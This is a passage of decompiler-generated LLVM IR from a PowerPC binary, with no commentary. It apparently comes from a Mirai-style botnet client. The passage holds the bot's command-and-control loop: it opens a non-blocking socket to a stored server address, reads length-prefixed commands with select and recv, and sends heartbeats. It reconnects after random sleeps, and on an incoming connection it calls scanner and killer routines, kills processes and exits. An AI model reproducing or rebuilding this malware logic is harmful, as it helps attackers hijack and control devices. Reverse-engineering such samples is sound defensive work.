  store i32 %v1_100069b4, i32* %ctr.global-to-local, align 4
  %v2_100069b4 = icmp eq i32 %v1_100069b4, 0
  br i1 %v2_100069b4, label %dec_label_pc_100069b8, label %dec_label_pc_100069a8

dec_label_pc_100069b8:                            ; preds = %dec_label_pc_100069a8
  %v0_100069b8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_100069b8, i32* %stack_var_-1240, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  store i32 31, i32* %ctr.global-to-local, align 4
  store i32 4, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100069c8

dec_label_pc_100069c8:                            ; preds = %dec_label_pc_100069c8, %dec_label_pc_100069b8
  %v1_100069cc = phi i32 [ %v1_100069d0, %dec_label_pc_100069c8 ], [ 4, %dec_label_pc_100069b8 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_100069cc = load i32, i32* @r29, align 4
  %v3_100069cc = add i32 %v2_100069cc, %v1_100069cc
  %v4_100069cc = inttoptr i32 %v3_100069cc to i32*
  store i32 0, i32* %v4_100069cc, align 4
  %v0_100069d0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100069d0 = add i32 %v0_100069d0, 4
  store i32 %v1_100069d0, i32* %r9.global-to-local, align 4
  %v0_100069d4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100069d4 = add i32 %v0_100069d4, -1
  store i32 %v1_100069d4, i32* %ctr.global-to-local, align 4
  %v2_100069d4 = icmp eq i32 %v1_100069d4, 0
  br i1 %v2_100069d4, label %dec_label_pc_100069d8, label %dec_label_pc_100069c8

dec_label_pc_100069d8:                            ; preds = %dec_label_pc_100069c8
  %v3_100069d8 = load i32, i32* @global_var_1002119c.118, align 4
  %v3_100069dc = icmp eq i32 %v3_100069d8, -1
  br i1 %v3_100069dc, label %dec_label_pc_10006a04, label %dec_label_pc_100069e4

dec_label_pc_100069e4:                            ; preds = %dec_label_pc_100069d8
  %v1_100069e4 = call i32 @__asm_rlwinm(i32 %v3_100069d8, i32 29, i32 3, i32 29)
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_100069ec = load i32, i32* @r30, align 4
  %v2_100069ec = add i32 %v1_100069ec, %v1_100069e4
  %v1_100069f0 = urem i32 %v3_100069d8, 32
  %v1_100069f4 = add i32 %v2_100069ec, 112
  %v2_100069f4 = inttoptr i32 %v1_100069f4 to i32*
  %v3_100069f4 = load i32, i32* %v2_100069f4, align 4
  %v3_100069f8 = shl i32 1, %v1_100069f0
  store i32 %v3_100069f8, i32* %r0.global-to-local, align 4
  %v2_100069fc = or i32 %v3_100069f4, %v3_100069f8
  store i32 %v2_100069fc, i32* %r9.global-to-local, align 4
  store i32 %v2_100069fc, i32* %v2_100069f4, align 4
  br label %dec_label_pc_10006a04

dec_label_pc_10006a04:                            ; preds = %dec_label_pc_100069d8, %dec_label_pc_100069e4
  %v3_10006a04 = load i32, i32* @global_var_100211a0.137, align 4
  store i32 %v3_10006a04, i32* %r0.global-to-local, align 4
  %v3_10006a08 = icmp eq i32 %v3_10006a04, -1
  br i1 %v3_10006a08, label %dec_label_pc_10006bdc, label %dec_label_pc_10006a10

dec_label_pc_10006a10:                            ; preds = %dec_label_pc_10006bdc, %dec_label_pc_10006a04, %dec_label_pc_10006c34
  %v3_10006b2c = phi i32 [ -1, %dec_label_pc_10006bdc ], [ %v3_10006a04, %dec_label_pc_10006a04 ], [ %v3_10006b2c.pre, %dec_label_pc_10006c34 ]
  %v3_10006a10 = load i8, i8* bitcast (i16* @global_var_100211f0.138 to i8*), align 2
  %v3_10006a14 = icmp eq i8 %v3_10006a10, 0
  store i32 %v3_10006b2c, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_10006b34 = call i32 @__asm_rlwinm(i32 %v3_10006b2c, i32 29, i32 3, i32 29)
  %v0_10006b38 = load i32, i32* %r3.global-to-local, align 4
  %v1_10006b38 = urem i32 %v0_10006b38, 32
  %v1_10006b3c = load i32, i32* @r30, align 4
  %v2_10006b3c = add i32 %v1_10006b3c, %v1_10006b34
  %v0_10006b40 = load i32, i32* %r0.global-to-local, align 4
  %v3_10006b40 = shl i32 %v0_10006b40, %v1_10006b38
  store i32 %v3_10006b40, i32* %r0.global-to-local, align 4
  br i1 %v3_10006a14, label %dec_label_pc_10006b2c, label %dec_label_pc_10006a1c

dec_label_pc_10006a1c:                            ; preds = %dec_label_pc_10006a10
  %v1_10006a34 = add i32 %v2_10006b3c, 240
  %v2_10006a34 = inttoptr i32 %v1_10006a34 to i32*
  %v3_10006a34 = load i32, i32* %v2_10006a34, align 4
  %v2_10006a38 = or i32 %v3_10006a34, %v3_10006b40
  store i32 %v2_10006a38, i32* %r9.global-to-local, align 4
  store i32 %v2_10006a38, i32* %v2_10006a34, align 4
  br label %dec_label_pc_10006a40

dec_label_pc_10006a40:                            ; preds = %dec_label_pc_10006b2c, %dec_label_pc_10006a1c
  %v3_10006a40 = load i32, i32* @global_var_1002119c.118, align 4
  store i32 %v3_10006a40, i32* %r0.global-to-local, align 4
  %v0_10006a44 = load i32, i32* %r3.global-to-local, align 4
  %v2_10006a44 = icmp slt i32 %v0_10006a44, %v3_10006a40
  br i1 %v2_10006a44, label %dec_label_pc_10006a4c, label %dec_label_pc_10006a50

dec_label_pc_10006a4c:                            ; preds = %dec_label_pc_10006a40
  store i32 %v3_10006a40, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006a50

dec_label_pc_10006a50:                            ; preds = %dec_label_pc_10006a40, %dec_label_pc_10006a4c
  %v0_10006a58 = phi i32 [ %v0_10006a44, %dec_label_pc_10006a40 ], [ %v3_10006a40, %dec_label_pc_10006a4c ]
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r9.global-to-local, align 4
  %v1_10006a58 = add i32 %v0_10006a58, 1
  store i32 %v1_10006a58, i32* %r3.global-to-local, align 4
  store i32 10, i32* %stack_var_-1456, align 4
  store i32 268462712, i32* @lr, align 4
  %v5_10006a74 = call i32 @__libc_select(i32 %v1_10006a58, i32 %v2_10006958, i32 %v2_10006960, i32 0, i32 %v2_10006984)
  %v6_10006a74 = trunc i32 %v5_10006a74 to i16
  store i32 %v5_10006a74, i32* %r3.global-to-local, align 4
  %v4_10006a78 = icmp eq i16 %v6_10006a74, -1
  br i1 %v4_10006a78, label %dec_label_pc_10006994, label %dec_label_pc_10006a80

dec_label_pc_10006a80:                            ; preds = %dec_label_pc_10006a50
  %v4_10006a80 = icmp eq i16 %v6_10006a74, 0
  br i1 %v4_10006a80, label %dec_label_pc_10006a88, label %dec_label_pc_10006ab0

dec_label_pc_10006a88:                            ; preds = %dec_label_pc_10006a80
  %v0_10006a8c = load i32, i32* @r20, align 4
  store i16 0, i16* %stack_var_-1480, align 2
  %v2_10006a98 = srem i32 %v0_10006a8c, 6
  store i32 %v2_10006a98, i32* %r0.global-to-local, align 4
  %v1_10006aa4 = add i32 %v0_10006a8c, 1
  store i32 %v1_10006aa4, i32* @r20, align 4
  %v3_10006aa8 = icmp eq i32 %v2_10006a98, 0
  br i1 %v3_10006aa8, label %dec_label_pc_10006c50, label %dec_label_pc_10006ab0

dec_label_pc_10006ab0:                            ; preds = %dec_label_pc_10006a80, %dec_label_pc_10006a88, %dec_label_pc_10006c50
  %v3_10006ab0 = load i32, i32* @global_var_1002119c.118, align 4
  store i32 %v3_10006ab0, i32* %r3.global-to-local, align 4
  %v3_10006ab4 = icmp eq i32 %v3_10006ab0, -1
  br i1 %v3_10006ab4, label %dec_label_pc_10006ad8, label %dec_label_pc_10006abc

dec_label_pc_10006abc:                            ; preds = %dec_label_pc_10006ab0
  %v1_10006abc = call i32 @__asm_rlwinm(i32 %v3_10006ab0, i32 29, i32 3, i32 29)
  %v1_10006ac0 = urem i32 %v3_10006ab0, 32
  %v1_10006ac4 = load i32, i32* @r30, align 4
  %v2_10006ac4 = add i32 %v1_10006ac4, %v1_10006abc
  store i32 %v2_10006ac4, i32* %r9.global-to-local, align 4
  %v1_10006ac8 = add i32 %v2_10006ac4, 112
  %v2_10006ac8 = inttoptr i32 %v1_10006ac8 to i32*
  %v3_10006ac8 = load i32, i32* %v2_10006ac8, align 4
  %v3_10006acc = sub i32 0, %v3_10006ab0
  %v4_10006acc = urem i32 %v3_10006acc, 32
  %v5_10006acc = shl i32 %v3_10006ac8, %v4_10006acc
  %v6_10006acc = xor i32 %v4_10006acc, 31
  %v7_10006acc = lshr i32 %v3_10006ac8, %v6_10006acc
  %v8_10006acc = udiv i32 %v7_10006acc, 2
  %v9_10006acc = or i32 %v8_10006acc, %v5_10006acc
  %v12_10006acc = lshr i32 -1, %v1_10006ac0
  %v14_10006acc = and i32 %v9_10006acc, %v12_10006acc
  %v15_10006acc = ashr i32 %v3_10006ac8, 31
  %v16_10006acc = sub i32 -1, %v12_10006acc
  %v17_10006acc = and i32 %v15_10006acc, %v16_10006acc
  %v18_10006acc = or i32 %v14_10006acc, %v17_10006acc
  store i32 %v18_10006acc, i32* %r0.global-to-local, align 4
  %v1_10006ad0 = urem i32 %v18_10006acc, 2
  store i32 %v1_10006ad0, i32* %r9.global-to-local, align 4
  %v3_10006ad0 = icmp eq i32 %v1_10006ad0, 0
  br i1 %v3_10006ad0, label %dec_label_pc_10006ad8, label %dec_label_pc_10006ccc

dec_label_pc_10006ad8:                            ; preds = %dec_label_pc_10006abc, %dec_label_pc_10006ab0
  %v3_10006ad8 = load i8, i8* bitcast (i16* @global_var_100211f0.138 to i8*), align 2
  %v4_10006ad8 = zext i8 %v3_10006ad8 to i32
  store i32 %v4_10006ad8, i32* @r31, align 4
  %v3_10006adc = icmp eq i8 %v3_10006ad8, 0
  %v3_10006b54 = load i32, i32* @global_var_100211a0.137, align 4
  br i1 %v3_10006adc, label %dec_label_pc_10006b54, label %dec_label_pc_10006ae4

dec_label_pc_10006ae4:                            ; preds = %dec_label_pc_10006ad8
  store i32 %v3_10006b54, i32* @r3, align 4
  %v1_10006ae8 = call i32 @__asm_rlwinm(i32 %v3_10006b54, i32 29, i32 3, i32 29)
  %v0_10006aec = load i32, i32* @r3, align 4
  %v1_10006aec = urem i32 %v0_10006aec, 32
  %v1_10006af0 = load i32, i32* @r30, align 4
  %v2_10006af0 = add i32 %v1_10006af0, %v1_10006ae8
  store i32 %v2_10006af0, i32* %r9.global-to-local, align 4
  %v1_10006af4 = add i32 %v2_10006af0, 240
  %v2_10006af4 = inttoptr i32 %v1_10006af4 to i32*
  %v3_10006af4 = load i32, i32* %v2_10006af4, align 4
  %v3_10006af8 = sub i32 0, %v0_10006aec
  %v4_10006af8 = urem i32 %v3_10006af8, 32
  %v5_10006af8 = shl i32 %v3_10006af4, %v4_10006af8
  %v6_10006af8 = xor i32 %v4_10006af8, 31
  %v7_10006af8 = lshr i32 %v3_10006af4, %v6_10006af8
  %v8_10006af8 = udiv i32 %v7_10006af8, 2
  %v9_10006af8 = or i32 %v8_10006af8, %v5_10006af8
  %v12_10006af8 = lshr i32 -1, %v1_10006aec
  %v14_10006af8 = and i32 %v9_10006af8, %v12_10006af8
  %v15_10006af8 = ashr i32 %v3_10006af4, 31
  %v16_10006af8 = sub i32 -1, %v12_10006af8
  %v17_10006af8 = and i32 %v15_10006af8, %v16_10006af8
  %v18_10006af8 = or i32 %v14_10006af8, %v17_10006af8
  store i32 %v18_10006af8, i32* %r0.global-to-local, align 4
  %v1_10006afc = urem i32 %v18_10006af8, 2
  %v3_10006afc = icmp eq i32 %v1_10006afc, 0
  store i32 0, i32* %r9.global-to-local, align 4
  store i8 0, i8* bitcast (i16* @global_var_100211f0.138 to i8*), align 2
  br i1 %v3_10006afc, label %dec_label_pc_10006b0c, label %dec_label_pc_10006c68

dec_label_pc_10006b0c:                            ; preds = %dec_label_pc_10006ae4, %dec_label_pc_10006d80
  %v0_10006b0c = phi i32 [ %v3_10006d80, %dec_label_pc_10006d80 ], [ %v0_10006aec, %dec_label_pc_10006ae4 ]
  %v3_10006b0c = icmp eq i32 %v0_10006b0c, -1
  br i1 %v3_10006b0c, label %dec_label_pc_10006b18, label %dec_label_pc_10006b14

dec_label_pc_10006b14:                            ; preds = %dec_label_pc_10006b0c
  %v0_10006b14 = call i32 @__GI___libc_close()
  store i32 %v0_10006b14, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006b18

dec_label_pc_10006b18:                            ; preds = %dec_label_pc_10006b0c, %dec_label_pc_10006b14
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 -1, i32* @global_var_100211a0.137, align 4
  store i32 268462888, i32* @lr, align 4
  %v1_10006b24 = call i32 @sleep(i32 1)
  store i32 %v1_10006b24, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006994

dec_label_pc_10006b2c:                            ; preds = %dec_label_pc_10006a10
  %v1_10006b44 = add i32 %v2_10006b3c, 112
  %v2_10006b44 = inttoptr i32 %v1_10006b44 to i32*
  %v3_10006b44 = load i32, i32* %v2_10006b44, align 4
  %v2_10006b48 = or i32 %v3_10006b44, %v3_10006b40
  store i32 %v2_10006b48, i32* %r9.global-to-local, align 4
  store i32 %v2_10006b48, i32* %v2_10006b44, align 4
  br label %dec_label_pc_10006a40

dec_label_pc_10006b54:                            ; preds = %dec_label_pc_10006ad8
  %v3_10006b58 = icmp eq i32 %v3_10006b54, -1
  br i1 %v3_10006b58, label %dec_label_pc_10006994, label %dec_label_pc_10006b60

dec_label_pc_10006b60:                            ; preds = %dec_label_pc_10006b54
  %v1_10006b60 = call i32 @__asm_rlwinm(i32 %v3_10006b54, i32 29, i32 3, i32 29)
  %v1_10006b64 = urem i32 %v3_10006b54, 32
  %v1_10006b68 = load i32, i32* @r30, align 4
  %v2_10006b68 = add i32 %v1_10006b68, %v1_10006b60
  store i32 %v2_10006b68, i32* %r9.global-to-local, align 4
  %v1_10006b6c = add i32 %v2_10006b68, 112
  %v2_10006b6c = inttoptr i32 %v1_10006b6c to i32*
  %v3_10006b6c = load i32, i32* %v2_10006b6c, align 4
  %v3_10006b70 = sub i32 0, %v3_10006b54
  %v4_10006b70 = urem i32 %v3_10006b70, 32
  %v5_10006b70 = shl i32 %v3_10006b6c, %v4_10006b70
  %v6_10006b70 = xor i32 %v4_10006b70, 31
  %v7_10006b70 = lshr i32 %v3_10006b6c, %v6_10006b70
  %v8_10006b70 = udiv i32 %v7_10006b70, 2
  %v9_10006b70 = or i32 %v8_10006b70, %v5_10006b70
  %v12_10006b70 = lshr i32 -1, %v1_10006b64
  %v14_10006b70 = and i32 %v9_10006b70, %v12_10006b70
  %v15_10006b70 = ashr i32 %v3_10006b6c, 31
  %v16_10006b70 = sub i32 -1, %v12_10006b70
  %v17_10006b70 = and i32 %v15_10006b70, %v16_10006b70
  %v18_10006b70 = or i32 %v14_10006b70, %v17_10006b70
  store i32 %v18_10006b70, i32* %r0.global-to-local, align 4
  %v1_10006b74 = urem i32 %v18_10006b70, 2
  store i32 %v1_10006b74, i32* %r9.global-to-local, align 4
  %v3_10006b74 = icmp eq i32 %v1_10006b74, 0
  br i1 %v3_10006b74, label %dec_label_pc_10006994, label %dec_label_pc_10006b7c

dec_label_pc_10006b7c:                            ; preds = %dec_label_pc_10006b60
  %v0_10006b7c = load i32, i32* @r31, align 4
  %v6_10006b7c = trunc i32 %v0_10006b7c to i16
  store i16 %v6_10006b7c, i16* %stack_var_-1480, align 2
  %v0_10006b80 = call i32 @__GI___errno_location()
  %v0_10006b84 = load i32, i32* @r31, align 4
  %v2_10006b84 = inttoptr i32 %v0_10006b80 to i32*
  store i32 %v0_10006b84, i32* %v2_10006b84, align 4
  %v3_10006b94 = load i32, i32* @global_var_100211a0.137, align 4
  store i32 %v3_10006b94, i32* %r3.global-to-local, align 4
  store i32 268463008, i32* @lr, align 4
  %v4_10006b9c = call i32 @__libc_recv(i32 %v3_10006b94, i32 %v2_1000678c, i32 2, i32 16386)
  store i32 %v4_10006b9c, i32* %r3.global-to-local, align 4
  %v3_10006ba0 = icmp eq i32 %v4_10006b9c, -1
  br i1 %v3_10006ba0, label %dec_label_pc_10006d6c, label %dec_label_pc_10006ba8

dec_label_pc_10006ba8:                            ; preds = %dec_label_pc_10006b7c
  %v3_10006ba8 = icmp eq i32 %v4_10006b9c, 0
  br i1 %v3_10006ba8, label %dec_label_pc_10006d80, label %dec_label_pc_10006bb0

dec_label_pc_10006bb0:                            ; preds = %dec_label_pc_10006ba8
  %v3_10006bb0 = load i16, i16* %stack_var_-1480, align 2
  %v4_10006bb0 = sext i16 %v3_10006bb0 to i32
  %v4_10006bb4 = icmp eq i16 %v3_10006bb0, 0
  br i1 %v4_10006bb4, label %dec_label_pc_10006e00, label %dec_label_pc_10006bbc

dec_label_pc_10006bbc:                            ; preds = %dec_label_pc_10006bb0
  %tmp47 = icmp ult i16 %v3_10006bb0, 1025
  br i1 %tmp47, label %dec_label_pc_10006d94, label %dec_label_pc_10006bc8

dec_label_pc_10006bc8:                            ; preds = %dec_label_pc_10006bbc
  %v3_10006bc8 = load i32, i32* @global_var_100211a0.137, align 4
  store i32 %v3_10006bc8, i32* @r3, align 4
  %v0_10006bcc = call i32 @__GI___libc_close()
  store i32 %v0_10006bcc, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 -1, i32* @global_var_100211a0.137, align 4
  br label %dec_label_pc_10006994

dec_label_pc_10006bdc:                            ; preds = %dec_label_pc_10006a04
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268463084, i32* @lr, align 4
  %v3_10006be8 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_10006be8, i32* %r3.global-to-local, align 4
  %v3_10006bec = icmp eq i32 %v3_10006be8, -1
  store i32 %v3_10006be8, i32* @global_var_100211a0.137, align 4
  br i1 %v3_10006bec, label %dec_label_pc_10006a10, label %dec_label_pc_10006bfc

dec_label_pc_10006bfc:                            ; preds = %dec_label_pc_10006bdc
  store i32 3, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 268463116, i32* @lr, align 4
  %v1_10006c08 = call i32 @__libc_fcntl(i32 3)
  store i32 4, i32* @r4, align 4
  %v1_10006c10 = or i32 %v1_10006c08, 2048
  store i32 %v1_10006c10, i32* @r5, align 4
  %v0_10006c14 = load i32, i32* @r31, align 4
  store i32 %v0_10006c14, i32* %r3.global-to-local, align 4
  store i32 268463136, i32* @lr, align 4
  %v2_10006c1c = call i32 @__libc_fcntl(i32 %v0_10006c14)
  store i32 %v2_10006c1c, i32* %r3.global-to-local, align 4
  %v3_10006c20 = load i32, i32* @global_var_10021198.113, align 4
  store i32 %v3_10006c20, i32* %r0.global-to-local, align 4
  %v3_10006c24 = icmp eq i32 %v3_10006c20, 0
  br i1 %v3_10006c24, label %dec_label_pc_10006c34, label %dec_label_pc_10006c2c

dec_label_pc_10006c2c:                            ; preds = %dec_label_pc_10006bfc
  store i32 %v3_10006c20, i32* %ctr.global-to-local, align 4
  store i32 268463156, i32* @lr, align 4
  %v2_10006c30 = call i32 @util_local_addr(i32 %v2_10006c1c)
  store i32 %v2_10006c30, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006c34

dec_label_pc_10006c34:                            ; preds = %dec_label_pc_10006bfc, %dec_label_pc_10006c2c
  %v3_10006c34 = load i32, i32* @global_var_100211a0.137, align 4
  store i32 %v3_10006c34, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10006c3c = load i32, i32* @r25, align 4
  store i8 1, i8* bitcast (i16* @global_var_100211f0.138 to i8*), align 2
  store i32 268463180, i32* @lr, align 4
  %v3_10006c48 = call i32 @__libc_connect(i32 %v3_10006c34, i32 %v0_10006c3c, i32 16)
  store i32 %v3_10006c48, i32* %r3.global-to-local, align 4
  %v3_10006b2c.pre = load i32, i32* @global_var_100211a0.137, align 4
  br label %dec_label_pc_10006a10

dec_label_pc_10006c50:                            ; preds = %dec_label_pc_10006a88
  %v3_10006c50 = load i32, i32* @global_var_100211a0.137, align 4
  store i32 %v3_10006c50, i32* %r3.global-to-local, align 4
  store i32 268463204, i32* @lr, align 4
  %v4_10006c60 = call i32 @__libc_send(i32 %v3_10006c50, i32 %v2_1000678c, i32 2, i32 16384)
  store i32 %v4_10006c60, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006ab0

dec_label_pc_10006c68:                            ; preds = %dec_label_pc_10006ae4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r9.global-to-local, align 4
  store i32 0, i32* %stack_var_-1472, align 4
  store i32 4, i32* %stack_var_-1468, align 4
  store i32 268463244, i32* @lr, align 4
  %v5_10006c88 = call i32 @getsockopt(i32 1, i32 4, i32 %v2_10006988, i32 %v2_10006c7c, i32 4)
  store i32 %v5_10006c88, i32* %r3.global-to-local, align 4
  %v3_10006c8c = load i32, i32* %stack_var_-1472, align 4
  store i32 %v3_10006c8c, i32* %r0.global-to-local, align 4
  %v3_10006c90 = icmp eq i32 %v3_10006c8c, 0
  br i1 %v3_10006c90, label %dec_label_pc_10006d0c, label %dec_label_pc_10006c98

dec_label_pc_10006c98:                            ; preds = %dec_label_pc_10006c68
  %v3_10006c98 = load i32, i32* @global_var_100211a0.137, align 4
  store i32 %v3_10006c98, i32* @r3, align 4
  %v0_10006c9c = call i32 @__GI___libc_close()
  store i32 %v0_10006c9c, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 -1, i32* @global_var_100211a0.137, align 4
  %v0_10006ca8 = call i32 @rand_next()
  %v1_10006ca8 = sext i32 %v0_10006ca8 to i64
  store i32 -858993459, i32* %r9.global-to-local, align 4
  %v5_10006cb0 = mul nuw nsw i64 %v1_10006ca8, 3435973837
  %v1_10006cb43 = udiv i64 %v5_10006cb0, 34359738368
  %v1_10006cb4 = trunc i64 %v1_10006cb43 to i32
  %v1_10006cb8 = mul i32 %v1_10006cb4, 10
  store i32 %v1_10006cb8, i32* %r0.global-to-local, align 4
  %v3_10006cbc = sub i32 %v0_10006ca8, %v1_10006cb8
  %v1_10006cc0 = add i32 %v3_10006cbc, 1
  store i32 %v1_10006cc0, i32* %r3.global-to-local, align 4
  store i32 268463304, i32* @lr, align 4
  %v1_10006cc4 = call i32 @sleep(i32 %v1_10006cc0)
  store i32 %v1_10006cc4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006994

dec_label_pc_10006ccc:                            ; preds = %dec_label_pc_10006abc
  store i32 16, i32* %r0.global-to-local, align 4
  store i32 16, i32* %stack_var_-1472, align 4
  store i32 ptrtoint (i32* @global_var_10006ce0.142 to i32), i32* @lr, align 4
  %v3_10006cdc = call i32 @__libc_accept(i32 %v2_10006cd4, i32 %v2_10006988, i32 %v1_10006ad0)
  store i32 %v3_10006cdc, i32* %r3.global-to-local, align 4
  store i32 268463332, i32* @lr, align 4
  %v1_10006ce0 = call i32 @scanner_kill(i32 %v3_10006cdc)
  store i32 %v1_10006ce0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006ce8.143 to i32), i32* @lr, align 4
  %v1_10006ce4 = call i32 @killer_kill(i32 %v1_10006ce0)
  %v0_10006ce8 = load i32, i32* @r17, align 4
  %v1_10006ce8 = sub i32 0, %v0_10006ce8
  store i32 %v1_10006ce8, i32* %r3.global-to-local, align 4
  store i32 268463348, i32* @lr, align 4
  %v2_10006cf0 = call i32 @kill(i32 %v1_10006ce8, i32 9)
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_10006cf8 = load i32, i32* @global_var_100211f4.121, align 4
  store i32 %v3_10006cf8, i32* %r3.global-to-local, align 4
  %v3_10006cfc = icmp eq i32 %v3_10006cf8, 0
  br i1 %v3_10006cfc, label %dec_label_pc_10006d04, label %dec_label_pc_10006d88

dec_label_pc_10006d04:                            ; preds = %dec_label_pc_10006ccc, %dec_label_pc_10006d88
  %v0_10006d08 = call i32 @__GI_exit()
  store i32 %v0_10006d08, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006d0c

dec_label_pc_10006d0c:                            ; preds = %dec_label_pc_10006c68, %dec_label_pc_10006d04
  store i32 %v2_100066ac, i32* %r3.global-to-local, align 4
  store i32 268463380, i32* @lr, align 4
  %v2_10006d10 = call i32 @util_strlen(i8* %v1_10006d10)
  %v3_10006d10 = trunc i32 %v2_10006d10 to i8
  store i32 %v2_10006d10, i32* %r3.global-to-local, align 4
  %v7_10006d14 = sext i8 %v3_10006d10 to i16
  store i16 %v7_10006d14, i16* %stack_var_-1480, align 2
  store i32 268463388, i32* @lr, align 4
  %v2_10006d18 = call i32 @util_local_addr(i32 %v2_10006d10)
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 %v2_10006d18, i32* @global_var_100211e0.76, align 4
  %v3_10006d2c = load i32, i32* @global_var_100211a0.137, align 4
  store i32 %v3_10006d2c, i32* %r3.global-to-local, align 4
  store i32 268463416, i32* @lr, align 4
  %v4_10006d34 = call i32 @__libc_send(i32 %v3_10006d2c, i32 ptrtoint (i32* @global_var_1001010c.144 to i32), i32 4, i32 16384)
  %v3_10006d38 = load i32, i32* @global_var_100211a0.137, align 4
  store i32 %v3_10006d38, i32* %r3.global-to-local, align 4
  store i32 268463436, i32* @lr, align 4
  %v4_10006d48 = call i32 @__libc_send(i32 %v3_10006d38, i32 %v2_1000678c, i32 1, i32 16384)
  store i32 %v4_10006d48, i32* %r3.global-to-local, align 4
  %v3_10006d4c = load i16, i16* %stack_var_-1480, align 2
  %v4_10006d50 = icmp eq i16 %v3_10006d4c, 0
  br i1 %v4_10006d50, label %dec_label_pc_10006994, label %dec_label_pc_10006d58

dec_label_pc_10006d58:                            ; preds = %dec_label_pc_10006d0c
  %v4_10006d4c = sext i16 %v3_10006d4c to i32
  %v3_10006d58 = load i32, i32* @global_var_100211a0.137, align 4
  store i32 %v3_10006d58, i32* %r3.global-to-local, align 4
  store i32 268463464, i32* @lr, align 4
  %v5_10006d64 = call i32 @__libc_send(i32 %v3_10006d58, i32 %v2_100066ac, i32 %v4_10006d4c, i32 16384)
  store i32 %v5_10006d64, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006994

dec_label_pc_10006d6c:                            ; preds = %dec_label_pc_10006d94, %dec_label_pc_10006b7c
  %v0_10006d6c = load i32, i32* @r27, align 4
  %v1_10006d6c = inttoptr i32 %v0_10006d6c to i32*
  %v2_10006d6c = load i32, i32* %v1_10006d6c, align 4
  store i32 %v2_10006d6c, i32* %r3.global-to-local, align 4
  %v3_10006d70 = icmp eq i32 %v2_10006d6c, 11
  br i1 %v3_10006d70, label %dec_label_pc_10006994, label %dec_label_pc_10006d78

dec_label_pc_10006d78:                            ; preds = %dec_label_pc_10006d6c
  %v3_10006d78 = icmp eq i32 %v2_10006d6c, 4
  br i1 %v3_10006d78, label %dec_label_pc_10006994, label %dec_label_pc_10006d80

dec_label_pc_10006d80:                            ; preds = %dec_label_pc_10006db0, %dec_label_pc_10006d78, %dec_label_pc_10006ba8
  %v3_10006d80 = load i32, i32* @global_var_100211a0.137, align 4
  store i32 %v3_10006d80, i32* @r3, align 4
  br label %dec_label_pc_10006b0c

dec_label_pc_10006d88:                            ; preds = %dec_label_pc_10006ccc
  store i32 268463504, i32* @lr, align 4
  %v2_10006d8c = call i32 @kill(i32 %v3_10006cf8, i32 9)
  store i32 %v2_10006d8c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006d04

dec_label_pc_10006d94:                            ; preds = %dec_label_pc_10006bbc
  %v0_10006d94 = load i32, i32* @r31, align 4
  %v1_10006d94 = load i32, i32* @r27, align 4
  %v2_10006d94 = inttoptr i32 %v1_10006d94 to i32*
  store i32 %v0_10006d94, i32* %v2_10006d94, align 4
  %v3_10006da0 = load i32, i32* @global_var_100211a0.137, align 4
  store i32 %v3_10006da0, i32* %r3.global-to-local, align 4
  store i32 268463528, i32* @lr, align 4
  %v5_10006da4 = call i32 @__libc_recv(i32 %v3_10006da0, i32 %v2_10006d98, i32 %v4_10006bb0, i32 16386)
  store i32 %v5_10006da4, i32* %r3.global-to-local, align 4
  %v3_10006da8 = icmp eq i32 %v5_10006da4, -1
  br i1 %v3_10006da8, label %dec_label_pc_10006d6c, label %dec_label_pc_10006db0

dec_label_pc_10006db0:                            ; preds = %dec_label_pc_10006d94
  %v3_10006db0 = icmp eq i32 %v5_10006da4, 0
  br i1 %v3_10006db0, label %dec_label_pc_10006d80, label %dec_label_pc_10006db8

dec_label_pc_10006db8:                            ; preds = %dec_label_pc_10006db0
  %v3_10006db8 = load i32, i32* @global_var_100211a0.137, align 4
  store i32 %v3_10006db8, i32* %r3.global-to-local, align 4
  store i32 268463564, i32* @lr, align 4
  %v4_10006dc8 = call i32 @__libc_recv(i32 %v3_10006db8, i32 %v2_1000678c, i32 2, i32 16384)
  %v3_10006dcc = load i16, i16* %stack_var_-1480, align 2
  %v4_10006dcc = sext i16 %v3_10006dcc to i32
  store i32 %v4_10006dcc, i32* %r0.global-to-local, align 4
  %v3_10006dd0 = load i32, i32* @global_var_100211a0.137, align 4
  store i32 %v3_10006dd0, i32* %r3.global-to-local, align 4
  store i32 268463592, i32* @lr, align 4
  %v5_10006de4 = call i32 @__libc_recv(i32 %v3_10006dd0, i32 %v2_10006d98, i32 %v4_10006dcc, i32 16384)
  store i32 %v5_10006de4, i32* %r3.global-to-local, align 4
  %v3_10006de8 = load i16, i16* %stack_var_-1480, align 2
  %v4_10006dec = icmp eq i16 %v3_10006de8, 0
  br i1 %v4_10006dec, label %dec_label_pc_10006994, label %dec_label_pc_10006df4

dec_label_pc_10006df4:                            ; preds = %dec_label_pc_10006db8
  %v4_10006de8 = sext i16 %v3_10006de8 to i32
